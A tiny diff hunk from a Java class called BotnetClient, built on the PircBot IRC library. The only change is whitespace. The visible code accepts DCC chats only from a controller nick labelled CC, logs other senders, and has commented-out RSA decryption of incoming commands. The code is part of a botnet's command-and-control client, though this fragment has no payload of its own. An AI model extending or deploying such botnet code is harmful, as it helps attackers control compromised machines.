@@ -231,7 +231,7 @@ public class BotnetClient extends PircBot {
 			try {
 				if (!chat.getNick().equalsIgnoreCase(CC)) {
 					System.out.println(chat.getNick() + "<" + chat.getHostname() + " | " + chat.getNumericalAddress() + "> tried to use me" );
-				} else {
+				} else { 
 					chat.accept();
 					//String s2 = m.decryptRSA(chat.readLine());
 					//System.out.println("c:" + s2);
